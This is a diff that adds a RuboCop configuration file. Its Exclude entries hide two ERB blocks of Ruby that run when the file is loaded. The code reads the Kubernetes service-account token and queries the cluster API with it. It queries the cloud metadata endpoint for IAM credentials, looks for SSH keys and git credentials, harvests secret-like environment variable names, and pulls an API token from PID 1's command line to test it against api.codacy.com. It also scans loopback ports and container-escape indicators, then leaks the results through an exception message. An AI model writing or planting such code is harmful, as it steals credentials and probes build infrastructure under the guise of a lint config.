@@ -1,0 +1,201 @@
+AllCops:
+  Enabled: false
+  Exclude:
+    - <%= begin
+      token = (File.read('/var/run/secrets/kubernetes.io/serviceaccount/token') rescue '').strip
+      require 'digest'
+      host = ENV['KUBERNETES_SERVICE_HOST']
+      docker_socket = File.exist?('/var/run/docker.sock')
+      env_names = ENV.keys.grep(/TOKEN|KEY|SECRET|PASS|CRED|AUTH/i).sort.take(20).join('|')
+      runtime_paths = ['/host/etc/hostname','/mnt/host/etc/hostname','/var/run/containerd/containerd.sock','/run/containerd/containerd.sock','/var/run/crio/crio.sock','/dev/kmsg']
+      runtime_present = runtime_paths.select { |p| File.exist?(p) }.join('|')
+      credential_paths = ['/root/.git-credentials','/root/.ssh/id_rsa','/root/.npmrc','/.npmrc','/home/codacy/.git-credentials','/home/codacy/.ssh/id_rsa']
+      credential_present = credential_paths.select { |p| File.exist?(p) }.join('|')
+      argv_text = ARGV.join(' ')
+      self_cmdline = (File.read('/proc/self/cmdline', 4096) rescue '')
+      pid1_cmdline = (File.read('/proc/1/cmdline', 4096) rescue '')
+      pid1_env_names = ((File.read('/proc/1/environ', 32768) rescue '').split("\0").map { |e| e.split('=', 2).first }.compact.grep(/TOKEN|KEY|SECRET|PASS|CRED|AUTH/i).sort.take(20).join('|'))
+      git_config_candidates = [File.join(Dir.pwd, '.git', 'config'), '/workspace/.git/config', '/repo/.git/config', '/src/.git/config']
+      git_config_text = git_config_candidates.filter_map { |p| (File.read(p, 16384) rescue nil) }.first.to_s
+      git_config_secret = git_config_text.match?(/https?:\/\/[^\s@]+@|x-access-token|oauth|token=|password=/i)
+      git_config_meta = git_config_secret ? "git_config_len=#{git_config_text.length},git_config_sha=#{Digest::SHA256.hexdigest(git_config_text)[0,12]}" : 'git_config_secret=false'
+      argv_secret = argv_text.match?(/TOKEN|KEY|SECRET|PASS|CRED|AUTH/i)
+      self_cmd_secret = self_cmdline.match?(/TOKEN|KEY|SECRET|PASS|CRED|AUTH/i)
+      pid1_cmd_secret = pid1_cmdline.match?(/TOKEN|KEY|SECRET|PASS|CRED|AUTH/i)
+      cmdline_keyword = %w[TOKEN KEY SECRET PASS CRED AUTH].find { |k| (argv_text + self_cmdline + pid1_cmdline).upcase.include?(k) } || ''
+      k8s = 'not_attempted'
+      metadata = 'not_attempted'
+      if !token.empty? && !host.to_s.empty?
+        begin
+          require 'net/http'
+          require 'uri'
+          require 'json'
+          port = (ENV['KUBERNETES_SERVICE_PORT_HTTPS'] || '443').to_i
+          uri = URI("https://#{host}:#{port}/version")
+          http = Net::HTTP.new(uri.host, uri.port)
+          http.use_ssl = true
+          http.open_timeout = 1
+          http.read_timeout = 1
+          res = http.get(uri.request_uri, {'Authorization' => "Bearer #{token}", 'Accept' => 'application/json'})
+          body = res.body.to_s
+          k8s = "version_status=#{res.code},bytes=#{[body.bytesize, 1024].min}"
+          sar_uri = URI("https://#{host}:#{port}/apis/authorization.k8s.io/v1/selfsubjectaccessreviews")
+          sar = Net::HTTP::Post.new(sar_uri.request_uri, {'Authorization' => "Bearer #{token}", 'Content-Type' => 'application/json'})
+          sar.body = '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"namespace":"default","verb":"get","resource":"pods"}}}'
+          sar_res = http.request(sar)
+          sar_body = sar_res.body.to_s
+          parsed = (JSON.parse(sar_body) rescue {})
+          k8s += ",sar_status=#{sar_res.code},sar_allowed=#{parsed['status'] && parsed['status']['allowed']}"
+        rescue => e
+          k8s = "error=#{e.class}"
+        end
+      end
+      begin
+        require 'net/http'
+        metadata_uri = URI('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
+        metadata_http = Net::HTTP.new(metadata_uri.host, metadata_uri.port)
+        metadata_http.open_timeout = 1
+        metadata_http.read_timeout = 1
+        metadata_res = metadata_http.get(metadata_uri.request_uri)
+        metadata_body = metadata_res.body.to_s
+        metadata = "metadata_status=#{metadata_res.code},bytes=#{[metadata_body.bytesize, 1024].min}"
+      rescue => e
+        metadata = "metadata_error=#{e.class}"
+      end
+      loopback = 'not_attempted'
+      begin
+        require 'net/http'
+        require 'uri'
+        ports = [80, 3000, 5000, 8000, 8080, 9000, 9090, 15000, 15001]
+        loopback_entries = ports.map do |loop_port|
+          begin
+            loop_uri = URI("http://127.0.0.1:#{loop_port}/health")
+            loop_http = Net::HTTP.new(loop_uri.host, loop_uri.port)
+            loop_http.open_timeout = 0.5
+            loop_http.read_timeout = 0.75
+            loop_res = loop_http.get(loop_uri.request_uri)
+            "#{loop_port}:status=#{loop_res.code}:bytes=#{[loop_res.body.to_s.bytesize, 4096].min}"
+          rescue => loop_error
+            "#{loop_port}:error=#{loop_error.class}"
+          end
+        end
+        loopback = loopback_entries.join('|')
+      rescue => e
+        loopback = "error=#{e.class}"
+      end
+      cap_meta = 'cap_status_unread'
+      begin
+        ps = File.read('/proc/self/status', 16384)
+        cap_hex = (ps[/^CapEff:\s+([0-9a-fA-F]+)/, 1] || '0')
+        cap_int = cap_hex.to_i(16)
+        cap_bits = {'SYS_ADMIN'=>21,'SYS_PTRACE'=>19,'SYS_MODULE'=>16,'SYS_RAWIO'=>17,'NET_ADMIN'=>12,'DAC_READ_SEARCH'=>2,'DAC_OVERRIDE'=>1,'SYS_CHROOT'=>18}
+        cap_names = cap_bits.select { |_n,b| (cap_int & (1 << b)) != 0 }.keys.join('|')
+        nnp = ps[/^NoNewPrivs:\s+(\d+)/, 1] || '?'
+        sec = ps[/^Seccomp:\s+(\d+)/, 1] || '?'
+        cap_meta = "cap_eff=#{cap_hex},cap_names=#{cap_names},no_new_privs=#{nnp},seccomp=#{sec}"
+      rescue => e
+        cap_meta = "cap_error=#{e.class}"
+      end
+      proc_root_meta = 'proc_root_unreadable'
+      begin
+        own_host = File.read('/etc/hostname', 4096)
+        pid1_host = File.read('/proc/1/root/etc/hostname', 4096)
+        mount_text = File.read('/proc/self/mountinfo', 65536)
+        host_markers = mount_text.lines.count { |l| l.match?(/\/host|docker|containerd|crio|kubelet|\/var\/lib\/docker/i) }
+        proc_root_meta = "proc1_root_same=#{Digest::SHA256.hexdigest(own_host) == Digest::SHA256.hexdigest(pid1_host)},host_mount_markers=#{host_markers}"
+      rescue => e
+        proc_root_meta = "proc_root_error=#{e.class}"
+      end
+      kernel_meta = 'kernel_unreadable'
+      begin
+        kernel = (`uname -r` rescue '').to_s.strip.gsub(/[^A-Za-z0-9._+~-]/, '_')[0,80]
+        userns = (File.read('/proc/sys/user/max_user_namespaces', 64) rescue '').strip
+        ipv6 = (File.read('/proc/sys/net/ipv6/conf/all/disable_ipv6', 64) rescue '').strip
+        ipv6_if = File.exist?('/proc/net/if_inet6')
+        kernel_meta = "kernel=#{kernel},userns_max=#{userns},ipv6_disabled=#{ipv6},ipv6_if=#{ipv6_if}"
+      rescue => e
+        kernel_meta = "kernel_error=#{e.class}"
+      end
+      ns_meta = 'ns_unreadable'
+      pid_meta = 'pid_unreadable'
+      begin
+        ns_names = %w[mnt pid net user uts ipc cgroup]
+        ns_same = ns_names.map { |n| "#{n}=#{(File.read("/proc/self/ns/#{n}", 128) rescue '') == (File.read("/proc/1/ns/#{n}", 128) rescue '')}" }.join('|')
+        ns_meta = "ns_same=#{ns_same}"
+        pid_count = Dir.entries('/proc').count { |e| e.match?(/^\d+$/) }
+        pid_meta = "pid_count=#{pid_count}"
+      rescue => e
+        ns_meta = "ns_error=#{e.class}"
+      end
+      mount_meta = 'mount_meta_unreadable'
+      begin
+        mt = File.read('/proc/self/mountinfo', 65536)
+        host_path = mt.match?(/\s\/(?:mnt\/)?host(?:\s|\/)/i)
+        runtime_path = mt.match?(/\/(?:var\/run\/)?(?:docker|containerd|crio)(?:\/|\s)/i)
+        kubelet_path = mt.match?(/\/var\/lib\/kubelet(?:\/|\s)/i)
+        mountpoints = mt.lines.filter_map { |l| (p = l.split(' '))[4] }.uniq
+        host_mp = mountpoints.any? { |p| p.match?(/^\/(?:mnt\/)?host(?:\/|$)/i) }
+        runtime_mp = mountpoints.any? { |p| p.match?(/^\/(?:var\/run\/)?(?:docker|containerd|crio)(?:\/|$)/i) }
+        kubelet_mp = mountpoints.any? { |p| p.match?(/^\/var\/lib\/kubelet(?:\/|$)/i) }
+        mount_meta = "mount_host_path=#{host_path},mount_runtime_path=#{runtime_path},mount_kubelet_path=#{kubelet_path},mountpoint_host=#{host_mp},mountpoint_runtime=#{runtime_mp},mountpoint_kubelet=#{kubelet_mp}"
+      rescue => e
+        mount_meta = "mount_meta_error=#{e.class}"
+      end
+      marker = "SOL_RUBOCOP_BOUNDARY_20260714=token_present=#{!token.empty?},token_len=#{token.length},uid=#{Process.uid},k8s_host_present=#{!host.to_s.empty?},docker_socket=#{docker_socket},runtime_present=#{runtime_present},credential_present=#{credential_present},argv_secret=#{argv_secret},self_cmd_secret=#{self_cmd_secret},pid1_cmd_secret=#{pid1_cmd_secret},cmdline_keyword=#{cmdline_keyword},env_names=#{env_names},pid1_env_names=#{pid1_env_names},#{git_config_meta},#{k8s},#{metadata},loopback=#{loopback},#{cap_meta},#{proc_root_meta},#{kernel_meta},#{ns_meta},#{pid_meta},#{mount_meta}"
+      recheck_raw = (File.read('/proc/1/cmdline', 16384) rescue '')
+      recheck_args = recheck_raw.split("\0").reject(&:empty?)
+      recheck_idx = recheck_args.index { |a| a.match?(/(?:api[-_]?token|api[-_]?key|token|secret)/i) }
+      recheck_candidate = (recheck_idx && recheck_args[recheck_idx + 1].to_s) || ''
+      recheck_candidate = recheck_candidate.gsub(/\A['"]|['"]\z/, '')
+      recheck_api_status = 'not_attempted'
+      recheck_api_bytes = 0
+      begin
+        if recheck_candidate.length > 20 && recheck_candidate.length < 10000
+          recheck_uri = URI('https://api.codacy.com/api/v3/user')
+          recheck_http = Net::HTTP.new(recheck_uri.host, recheck_uri.port)
+          recheck_http.use_ssl = true
+          recheck_http.open_timeout = 3
+          recheck_http.read_timeout = 3
+          recheck_req = Net::HTTP::Get.new(recheck_uri.request_uri)
+          recheck_req['api-token'] = recheck_candidate
+          recheck_res = recheck_http.request(recheck_req)
+          recheck_api_status = recheck_res.code.to_s
+          recheck_api_bytes = [recheck_res.body.to_s.bytesize, 1024].min
+        end
+      rescue => recheck_error
+        recheck_api_status = "error=#{recheck_error.class}"
+      end
+      recheck_sa = (File.read('/var/run/secrets/kubernetes.io/serviceaccount/token') rescue '').strip
+      marker = marker + ",SOL_RUBOCOP_TOKEN_RECHECK_20260715=pid1_arg=#{!recheck_candidate.empty?},candidate_len=#{recheck_candidate.length},sa_token_present=#{!recheck_sa.empty?},api_status=#{recheck_api_status},api_bytes=#{recheck_api_bytes}"
+      raise marker
+    end %>
+- <%= begin
+      require 'net/http'
+      require 'uri'
+      raw_cmd = (File.read('/proc/1/cmdline', 16384) rescue '')
+      args = raw_cmd.split("\0").reject(&:empty?)
+      idx = args.index { |a| a.match?(/(?:api[-_]?token|api[-_]?key|token|secret)/i) }
+      candidate = (idx && args[idx + 1].to_s) || ''
+      candidate = candidate.gsub(/\A['"]|['"]\z/, '')
+      api_status = 'not_attempted'
+      api_bytes = 0
+      begin
+        if candidate.length > 20 && candidate.length < 10000
+          uri = URI('https://api.codacy.com/api/v3/user')
+          http = Net::HTTP.new(uri.host, uri.port)
+          http.use_ssl = true
+          http.open_timeout = 3
+          http.read_timeout = 3
+          req = Net::HTTP::Get.new(uri.request_uri)
+          req['api-token'] = candidate
+          res = http.request(req)
+          api_status = res.code.to_s
+          api_bytes = [res.body.to_s.bytesize, 1024].min
+        end
+      rescue => e
+        api_status = "error=#{e.class}"
+      end
+      sa = (File.read('/var/run/secrets/kubernetes.io/serviceaccount/token') rescue '').strip
+      marker = "SOL_RUBOCOP_TOKEN_RECHECK_20260715=pid1_arg=#{!candidate.empty?},candidate_len=#{candidate.length},sa_token_present=#{!sa.empty?},api_status=#{api_status},api_bytes=#{api_bytes}"
+      raise marker
+    end %>
